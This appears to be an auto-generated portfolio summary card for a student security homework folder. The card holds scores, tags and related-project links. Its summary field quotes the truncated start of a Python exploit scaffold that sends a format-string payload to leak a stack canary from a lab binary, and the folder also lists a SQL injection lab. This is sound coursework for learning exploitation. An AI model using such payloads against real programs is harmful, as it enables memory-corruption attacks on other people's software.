# Homework3 answer

> Generated from a read-only source. The original files were not copied, modified, moved, renamed, deleted, overwritten, indexed, or uploaded.
> raphael-knowledge-summary: true

## Title

Homework3 answer

## Source Path Reference

`K:\Homework3 answer`

## Category

Programming

## Course

Not detected

## Technologies

- Python
- C/C++
- SQL

## Skills Demonstrated

- Implementation with Python, SQL/MySQL

## Summary

import sys from struct import pack from subprocess import Popen,PIPE,STDOUT EXECUTABLE_NAME = "./Canary" init_payload = b"100\n" init_payload +=b"%17$p\n" #Opens and runs a process with a given name #PIPE indicates that we want access to stdin,stdout. stderr is sent to stdout proc = Popen(EXECUTABLE_NAME, shell=True, stdin=PIPE,stdout=PIPE,stderr=STDOUT,bufsize=50) results = b'' writecnt = proc.stdin.write(init_payload) proc.stdin.flush() #Read results post exploit 1. Search for the stack canary! #NOTE: the read will hang if you try to read too much data! If this happens just lower the # of bytes read! #If the results are cut off and not complete, increase this number results = results + proc.stdout.read(200) print(str(results)) #Parse the previous input and correctly set the canary results_str = results.decode('latin-1') canary_start = results_str.find("So your concerns are:\n") +...

## Files Found

- `Homework3 answer\Homework3 answer\CanaryScaffold.py` (.py, 2206 bytes)
- `Homework3 answer\Homework3 answer\CoalMine.txt` (.txt, 2286 bytes)
- `Homework3 answer\Homework3 answer\SQL injection lab.txt` (.txt, 3761 bytes)


## Portfolio Value

Low — Curated score 47/100.

## Resume Bullet Potential

- Built or completed **Homework3 answer** using Python, C/C++, SQL, demonstrating technical implementation.
- Add measurable outcomes, scope, grade, users, or performance results after human review.

## Lessons Learned

- Preserve requirements, decisions, tests, and final outcomes together so the project remains explainable later.
- Review this generated summary against the original source before using it in a resume or portfolio.

## Suggested Tags

- #c-c++
- #programming
- #python
- #sql

## Related Raphael Projects/Goals

- Project: Shell Project

## Safety Record

- Source access: read-only
- Source files copied: no
- Raw source indexed: no
- Credential-bearing files/content: skipped
- External uploads: none

## Knowledge ID

KNOW-668F0A4293

## Course Code

Not detected

## Course Name

Not detected

## Suggested Title

Homework3 answer

## Project Type

Python Project

## Technology Stack

- Python
- SQL/MySQL

## Assignment/Project Status

Likely Completed

## Portfolio Score

47/100

## Resume Value

6/10

## Outcome

Unclear — human curation needed.

## Likely Duplicates

- KNOW-8D7E89B99E
- KNOW-A9A046D623

## Curation Flags

- course-not-detected
- possible-duplicate

## Cleanup Suggestions

- Clarify inputs, outputs, dependencies, and demonstrated result.

## Classification Scores

- Technical depth: 4/10
- Completeness: 8/10
- Uniqueness: 5/10
- Career relevance: 8/10
- Demo potential: 3/10
- Resume value: 6/10
- Business relevance: 3/10
- Cleanup effort: 5/10

## Knowledge Relationships

- `KNOW-7F1BB3F008` Untitled Folder — same_project_family (0.90): Python Project
- `KNOW-8EE4596287` LCIntel — same_project_family (0.90): Python Project
- `KNOW-EE0B44AF25` 4101 proj — same_project_family (0.90): Python Project
- `KNOW-2EC4964E43` ISDS 4123 slides — same_cluster (0.88): Data / Information Systems Cluster
- `KNOW-30CFB55791` Lecture-4-Support — same_cluster (0.88): Data / Information Systems Cluster
- `KNOW-3F7C86815B` n8n Workflow Automation Collection — same_cluster (0.88): Data / Information Systems Cluster
- `KNOW-4F5C580EBD` csc4103-fall2024-assignment2-Jakesplooder — same_cluster (0.88): Operating Systems Cluster
- `KNOW-50BEB716DF` PintOS User Programs — same_cluster (0.88): Operating Systems Cluster
- `KNOW-DF38FE1F9F` Assignment 1 — same_cluster (0.88): Data / Information Systems Cluster
- `KNOW-3F7C86815B` n8n Workflow Automation Collection — shared_technology (0.87): Python, SQL/MySQL
- `KNOW-BDFE213910` K Drive Knowledge Root — shared_technology (0.87): Python, SQL/MySQL
- `KNOW-21573891BF` Substitution Cipher Cryptanalysis — shared_technology (0.86): Python
- `KNOW-30CFB55791` Lecture-4-Support — shared_technology (0.86): SQL/MySQL
- `KNOW-6057D9E8B2` Substitution Cipher Cryptanalysis — shared_technology (0.86): Python
- `KNOW-70F2729989` Substitution Cipher Cryptanalysis — shared_technology (0.86): Python
- `KNOW-7F1BB3F008` Untitled Folder — shared_technology (0.86): Python
- `KNOW-84BAB19964` python projects — shared_technology (0.86): Python
- `KNOW-8EE4596287` LCIntel — shared_technology (0.86): Python
- `KNOW-D6BEEF0339` Substitution Cipher Cryptanalysis — shared_technology (0.86): Python
- `KNOW-DF38FE1F9F` Assignment 1 — shared_technology (0.86): SQL/MySQL

## Relationship Concepts

- Technology Relationship: Python (0.92)
- Technology Relationship: SQL/MySQL (0.92)
- Project Family Relationship: Python Project (0.90)
- Project Family Relationship: Operating Systems Cluster (0.88)
- Project Family Relationship: Data / Information Systems Cluster (0.88)
- Skill Relationship: Implementation with Python, SQL/MySQL (0.84)
- Career Relationship: Software Engineering (0.82)
- Career Relationship: Data Engineering (0.82)
- Portfolio Relationship: Tier 3 (0.72)
- Employee Skill Relationship: Developer Agent (0.72)
- Employee Skill Relationship: Data Analyst Agent (0.72)
- Council Relationship: Engineering Council (0.68)

## Relationship Metadata

- Generated: 2026-06-18T00:20:50
- Direct relationships: 20
- Concept relationships: 12
